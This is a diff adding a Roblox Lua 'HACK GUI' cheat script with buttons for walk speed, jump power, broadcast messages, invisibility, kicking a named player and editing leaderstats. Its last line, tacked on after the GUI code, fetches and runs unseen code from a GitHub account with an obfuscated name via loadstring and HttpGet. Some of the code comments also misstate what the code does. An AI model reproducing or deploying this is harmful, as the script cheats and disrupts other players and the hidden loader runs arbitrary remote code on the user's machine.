@@ -1,0 +1,406 @@
+local GUIBYMjurDevs = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local Info = Instance.new("TextLabel")
+local Speed = Instance.new("Frame")
+local Accept = Instance.new("TextButton")
+local SpeedBox = Instance.new("TextBox")
+local Info_2 = Instance.new("TextLabel")
+local X = Instance.new("TextButton")
+local Jump = Instance.new("Frame")
+local Accept_2 = Instance.new("TextButton")
+local JumpBox = Instance.new("TextBox")
+local Info_3 = Instance.new("TextLabel")
+local Chat = Instance.new("Frame")
+local Accept_3 = Instance.new("TextButton")
+local Chat_2 = Instance.new("TextBox")
+local Info_4 = Instance.new("TextLabel")
+local Invisible = Instance.new("Frame")
+local on = Instance.new("TextButton")
+local Info_5 = Instance.new("TextLabel")
+local off = Instance.new("TextButton")
+local Kick = Instance.new("Frame")
+local Use = Instance.new("TextButton")
+local Info_6 = Instance.new("TextLabel")
+local PlrName = Instance.new("TextBox")
+local LeaderStatsEditor = Instance.new("Frame")
+local Add = Instance.new("TextButton")
+local Info_7 = Instance.new("TextLabel")
+local LeaderStats = Instance.new("TextBox")
+local ValueBox = Instance.new("TextBox")
+
+--Properties:
+
+GUIBYMjurDevs.Name = "GUI | BY: MjurDevs"
+GUIBYMjurDevs.Parent = game.CoreGui
+
+Main.Name = "Main"
+Main.Parent = GUIBYMjurDevs
+Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Main.Draggable = true
+Main.Position = UDim2.new(0.245901644, 0, 0.277985036, 0)
+Main.Size = UDim2.new(0, 400, 0, 250)
+Main.Active = true
+Main.Draggable = true
+
+
+Info.Name = "Info"
+Info.Parent = Main
+Info.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
+Info.Position = UDim2.new(-0.000724029553, 0, -0.0026119384, 0)
+Info.Size = UDim2.new(0, 400, 0, 23)
+Info.Font = Enum.Font.SourceSans
+Info.Text = "HACK GUI | BY: MjurDevs"
+Info.TextColor3 = Color3.fromRGB(0, 0, 0)
+Info.TextScaled = true
+Info.TextSize = 14.000
+Info.TextWrapped = true
+
+Speed.Name = "Speed"
+Speed.Parent = Main
+Speed.BackgroundColor3 = Color3.fromRGB(15, 171, 255)
+Speed.BorderSizePixel = 5
+Speed.Position = UDim2.new(0.0554098263, 0, 0.158432841, 0)
+Speed.Size = UDim2.new(0, 100, 0, 100)
+
+Accept.Name = "Accept"
+Accept.Parent = Speed
+Accept.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Accept.Position = UDim2.new(0, 0, 0.792000115, 0)
+Accept.Size = UDim2.new(0, 100, 0, 20)
+Accept.Font = Enum.Font.SourceSans
+Accept.Text = "Accept"
+Accept.TextColor3 = Color3.fromRGB(0, 0, 0)
+Accept.TextScaled = true
+Accept.TextSize = 14.000
+Accept.TextWrapped = true
+Accept.MouseButton1Down:connect(function()
+	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = SpeedBox.Text
+	wait(3)
+	print(game.Players.LocalPlayer.Name.." USE MjurDevs GUI to change his spped to "..game.Players.LocalPlayer.Character.Humanoid.WalkSpeed)
+end)
+
+SpeedBox.Name = "SpeedBox"
+SpeedBox.Parent = Speed
+SpeedBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SpeedBox.BackgroundTransparency = 1.000
+SpeedBox.Position = UDim2.new(-0.00999984704, 0, 0.25, 0)
+SpeedBox.Size = UDim2.new(0, 101, 0, 35)
+SpeedBox.Font = Enum.Font.SourceSans
+SpeedBox.Text = "Enter Speed"
+SpeedBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+SpeedBox.TextScaled = true
+SpeedBox.TextSize = 14.000
+SpeedBox.TextWrapped = true
+
+Info_2.Name = "Info"
+Info_2.Parent = Speed
+Info_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Info_2.BackgroundTransparency = 1.000
+Info_2.Position = UDim2.new(0, 0, 0.00400000066, 0)
+Info_2.Size = UDim2.new(0, 100, 0, 15)
+Info_2.Font = Enum.Font.SourceSans
+Info_2.Text = "Speed"
+Info_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+Info_2.TextScaled = true
+Info_2.TextSize = 14.000
+Info_2.TextWrapped = true
+
+X.Name = "X"
+X.Parent = Main
+X.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+X.BackgroundTransparency = 1.000
+X.Position = UDim2.new(0.943633854, 0, -0.0044776001, 0)
+X.Size = UDim2.new(0, 23, 0, 23)
+X.Font = Enum.Font.SourceSans
+X.Text = "X"
+X.TextColor3 = Color3.fromRGB(255, 0, 0)
+X.TextScaled = true
+X.TextSize = 14.000
+X.TextWrapped = true
+X.MouseButton1Down:connect(function()
+	GUIBYMjurDevs:Destroy()
+end)
+
+Jump.Name = "Jump"
+Jump.Parent = Main
+Jump.BackgroundColor3 = Color3.fromRGB(15, 171, 255)
+Jump.BorderSizePixel = 5
+Jump.Position = UDim2.new(0.0549999997, 122, 0.158000007, 0)
+Jump.Size = UDim2.new(0, 100, 0, 100)
+
+Accept_2.Name = "Accept"
+Accept_2.Parent = Jump
+Accept_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Accept_2.Position = UDim2.new(0, 0, 0.792000115, 0)
+Accept_2.Size = UDim2.new(0, 100, 0, 20)
+Accept_2.Font = Enum.Font.SourceSans
+Accept_2.Text = "Accept"
+Accept_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+Accept_2.TextScaled = true
+Accept_2.TextSize = 14.000
+Accept_2.TextWrapped = true
+Accept_2.MouseButton1Down:connect(function()
+	game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpBox.Text
+	wait(3)
+	print(game.Players.LocalPlayer.Name.." USE MjurDevs GUI to change his jump power to "..game.Players.LocalPlayer.Character.Humanoid.JumpPower)
+end)
+
+JumpBox.Name = "JumpBox"
+JumpBox.Parent = Jump
+JumpBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+JumpBox.BackgroundTransparency = 1.000
+JumpBox.Position = UDim2.new(-0.00999984704, 0, 0.25, 0)
+JumpBox.Size = UDim2.new(0, 101, 0, 35)
+JumpBox.Font = Enum.Font.SourceSans
+JumpBox.Text = "Enter JumpPower"
+JumpBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+JumpBox.TextScaled = true
+JumpBox.TextSize = 14.000
+JumpBox.TextWrapped = true
+
+Info_3.Name = "Info"
+Info_3.Parent = Jump
+Info_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Info_3.BackgroundTransparency = 1.000
+Info_3.Position = UDim2.new(0, 0, -0.00599999912, 0)
+Info_3.Size = UDim2.new(0, 100, 0, 15)
+Info_3.Font = Enum.Font.SourceSans
+Info_3.Text = "Jump"
+Info_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+Info_3.TextScaled = true
+Info_3.TextSize = 14.000
+Info_3.TextWrapped = true
+
+Chat.Name = "Chat"
+Chat.Parent = Main
+Chat.BackgroundColor3 = Color3.fromRGB(15, 171, 255)
+Chat.BorderSizePixel = 5
+Chat.Position = UDim2.new(0.0549999997, 244, 0.158000007, 0)
+Chat.Size = UDim2.new(0, 100, 0, 100)
+
+Accept_3.Name = "Accept"
+Accept_3.Parent = Chat
+Accept_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Accept_3.Position = UDim2.new(0, 0, 0.792000115, 0)
+Accept_3.Size = UDim2.new(0, 100, 0, 20)
+Accept_3.Font = Enum.Font.SourceSans
+Accept_3.Text = "Accept"
+Accept_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+Accept_3.TextScaled = true
+Accept_3.TextSize = 14.000
+Accept_3.TextWrapped = true
+Accept_3.MouseButton1Down:connect(function()
+	local Messege = Instance.new("Message",workspace)
+	Messege.Text = Chat_2.Text
+	wait(5)
+	Messege:Destroy()
+end)
+
+Chat_2.Name = "Chat"
+Chat_2.Parent = Chat
+Chat_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Chat_2.BackgroundTransparency = 1.000
+Chat_2.Position = UDim2.new(-0.00999984704, 0, 0.25, 0)
+Chat_2.Size = UDim2.new(0, 101, 0, 35)
+Chat_2.Font = Enum.Font.SourceSans
+Chat_2.Text = "Enter Messege ex. [MjurDevs]: HI"
+Chat_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+Chat_2.TextScaled = true
+Chat_2.TextSize = 14.000
+Chat_2.TextWrapped = true
+
+Info_4.Name = "Info"
+Info_4.Parent = Chat
+Info_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Info_4.BackgroundTransparency = 1.000
+Info_4.Position = UDim2.new(0, 0, -0.00599999912, 0)
+Info_4.Size = UDim2.new(0, 100, 0, 15)
+Info_4.Font = Enum.Font.SourceSans
+Info_4.Text = "Chat"
+Info_4.TextColor3 = Color3.fromRGB(0, 0, 0)
+Info_4.TextScaled = true
+Info_4.TextSize = 14.000
+Info_4.TextWrapped = true
+
+Invisible.Name = "Invisible"
+Invisible.Parent = Main
+Invisible.BackgroundColor3 = Color3.fromRGB(15, 171, 255)
+Invisible.BorderSizePixel = 5
+Invisible.Position = UDim2.new(0.0549999997, 0, 0.158000007, 105)
+Invisible.Size = UDim2.new(0, 100, 0, 100)
+
+on.Name = "on"
+on.Parent = Invisible
+on.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+on.Position = UDim2.new(0, 0, 0.792000115, 0)
+on.Size = UDim2.new(0, 100, 0, 20)
+on.Font = Enum.Font.SourceSans
+on.Text = "ON"
+on.TextColor3 = Color3.fromRGB(0, 0, 0)
+on.TextScaled = true
+on.TextSize = 14.000
+on.TextWrapped = true
+on.MouseButton1Click:Connect(function(player)
+	local humanoid = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
+	humanoid:RemoveAccessories()--Connects specified function when player joins.
+	--Connects specified function when player's character is loaded.
+	local character = workspace:WaitForChild(game.Players.LocalPlayer.Name) --We can now refer to the player's character as "character".
+	for i,v in pairs(character:children()) do --Gets all of character's children.
+		if v:IsA("Part") or v:IsA("MeshPart") then --If a found child is a part or mesh, then
+			v.Transparency = 1 --Set transparency to said child to 1
+		elseif v:IsA("Accessory") then --If a found child is an accessory, then
+			v:WaitForChild("Handle").Transparency = 1 --Set transparency of first child of accessory named "Handle" to 1
+		end
+	end
+	character:WaitForChild("Head"):FindFirstChildOfClass("Decal"):Destroy() --Destroys decal in character's head
+end)
+
+Info_5.Name = "Info"
+Info_5.Parent = Invisible
+Info_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Info_5.BackgroundTransparency = 1.000
+Info_5.Position = UDim2.new(0, 0, 0.00400000066, 0)
+Info_5.Size = UDim2.new(0, 100, 0, 15)
+Info_5.Font = Enum.Font.SourceSans
+Info_5.Text = "Invisible"
+Info_5.TextColor3 = Color3.fromRGB(0, 0, 0)
+Info_5.TextScaled = true
+Info_5.TextSize = 14.000
+Info_5.TextWrapped = true
+
+off.Name = "off"
+off.Parent = Invisible
+off.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+off.Position = UDim2.new(0, 0, 0.791999996, -20)
+off.Size = UDim2.new(0, 100, 0, 20)
+off.Font = Enum.Font.SourceSans
+off.Text = "OFF"
+off.TextColor3 = Color3.fromRGB(0, 0, 0)
+off.TextScaled = true
+off.TextSize = 14.000
+off.TextWrapped = true
+off.MouseButton1Click:Connect(function(player) --Connects specified function when player joins.
+	--Connects specified function when player's character is loaded.
+	local character = workspace:WaitForChild(game.Players.LocalPlayer.Name) --We can now refer to the player's character as "character".
+	for i,v in pairs(character:children()) do --Gets all of character's children.
+		if v:IsA("Part") or v:IsA("MeshPart") then --If a found child is a part or mesh, then
+			v.Transparency = 0 --Set transparency to said child to 1
+		elseif v:IsA("Accessory") then --If a found child is an accessory, then
+			v:WaitForChild("Handle").Transparency = 0 --Set transparency of first child of accessory named "Handle" to 1
+		end
+	end
+	character:WaitForChild("Head"):FindFirstChildOfClass("Decal"):Destroy() --Destroys decal in character's head
+end)
+
+Kick.Name = "Kick"
+Kick.Parent = Main
+Kick.BackgroundColor3 = Color3.fromRGB(15, 171, 255)
+Kick.BorderSizePixel = 5
+Kick.Position = UDim2.new(0.360000014, 0, 0.158000007, 105)
+Kick.Size = UDim2.new(0, 100, 0, 100)
+
+Use.Name = "Use"
+Use.Parent = Kick
+Use.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Use.Position = UDim2.new(0, 0, 0.792000115, 0)
+Use.Size = UDim2.new(0, 100, 0, 20)
+Use.Font = Enum.Font.SourceSans
+Use.Text = "Kick"
+Use.TextColor3 = Color3.fromRGB(0, 0, 0)
+Use.TextScaled = true
+Use.TextSize = 14.000
+Use.TextWrapped = true
+Use.MouseButton1Click:Connect(function()
+	local plr = game.Players:WaitForChild(PlrName.Text)
+	plr:Kick("HACK")
+end)
+
+
+Info_6.Name = "Info"
+Info_6.Parent = Kick
+Info_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Info_6.BackgroundTransparency = 1.000
+Info_6.Position = UDim2.new(0, 0, 0.00400000066, 0)
+Info_6.Size = UDim2.new(0, 100, 0, 15)
+Info_6.Font = Enum.Font.SourceSans
+Info_6.Text = "Kick"
+Info_6.TextColor3 = Color3.fromRGB(0, 0, 0)
+Info_6.TextScaled = true
+Info_6.TextSize = 14.000
+Info_6.TextWrapped = true
+
+PlrName.Name = "PlrName"
+PlrName.Parent = Kick
+PlrName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PlrName.BackgroundTransparency = 1.000
+PlrName.Position = UDim2.new(-0.00999984704, 0, 0.25, 0)
+PlrName.Size = UDim2.new(0, 101, 0, 35)
+PlrName.Font = Enum.Font.SourceSans
+PlrName.Text = "Enter Player Name"
+PlrName.TextColor3 = Color3.fromRGB(0, 0, 0)
+PlrName.TextScaled = true
+PlrName.TextSize = 14.000
+PlrName.TextWrapped = true
+
+LeaderStatsEditor.Name = "LeaderStatsEditor"
+LeaderStatsEditor.Parent = Main
+LeaderStatsEditor.BackgroundColor3 = Color3.fromRGB(15, 171, 255)
+LeaderStatsEditor.BorderSizePixel = 5
+LeaderStatsEditor.Position = UDim2.new(0.662500024, 0, 0.158000007, 105)
+LeaderStatsEditor.Size = UDim2.new(0, 100, 0, 100)
+
+Add.Name = "Add"
+Add.Parent = LeaderStatsEditor
+Add.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Add.Position = UDim2.new(0, 0, 0.792000115, 0)
+Add.Size = UDim2.new(0, 100, 0, 20)
+Add.Font = Enum.Font.SourceSans
+Add.Text = "Add"
+Add.TextColor3 = Color3.fromRGB(0, 0, 0)
+Add.TextScaled = true
+Add.TextSize = 14.000
+Add.TextWrapped = true
+Add.MouseButton1Click:Connect(function()
+	local lse = game.Players.LocalPlayer.leaderstats:WaitForChild(LeaderStats.Text)
+	lse.Value = lse.Value + ValueBox.Text
+end)
+
+Info_7.Name = "Info"
+Info_7.Parent = LeaderStatsEditor
+Info_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Info_7.BackgroundTransparency = 1.000
+Info_7.Position = UDim2.new(0, 0, 0.00400000066, 0)
+Info_7.Size = UDim2.new(0, 100, 0, 15)
+Info_7.Font = Enum.Font.SourceSans
+Info_7.Text = "LeaderStats Editor"
+Info_7.TextColor3 = Color3.fromRGB(0, 0, 0)
+Info_7.TextScaled = true
+Info_7.TextSize = 14.000
+Info_7.TextWrapped = true
+
+LeaderStats.Name = "LeaderStats"
+LeaderStats.Parent = LeaderStatsEditor
+LeaderStats.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LeaderStats.BackgroundTransparency = 1.000
+LeaderStats.Position = UDim2.new(0, 0, 0.150000006, 0)
+LeaderStats.Size = UDim2.new(0, 100, 0, 27)
+LeaderStats.Font = Enum.Font.SourceSans
+LeaderStats.Text = "Enter Stats"
+LeaderStats.TextColor3 = Color3.fromRGB(0, 0, 0)
+LeaderStats.TextScaled = true
+LeaderStats.TextSize = 14.000
+LeaderStats.TextWrapped = true
+
+ValueBox.Name = "Value"
+ValueBox.Parent = LeaderStatsEditor
+ValueBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ValueBox.BackgroundTransparency = 1.000
+ValueBox.Position = UDim2.new(0, 0, 0.349999994, 0)
+ValueBox.Size = UDim2.new(0, 100, 0, 35)
+ValueBox.Font = Enum.Font.SourceSans
+ValueBox.Text = "Enter Value"
+ValueBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+ValueBox.TextScaled = true
+ValueBox.TextSize = 14.000
+ValueBox.TextWrapped = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlllI/PartnerPSX/main/BetterPartnerTag", true))()
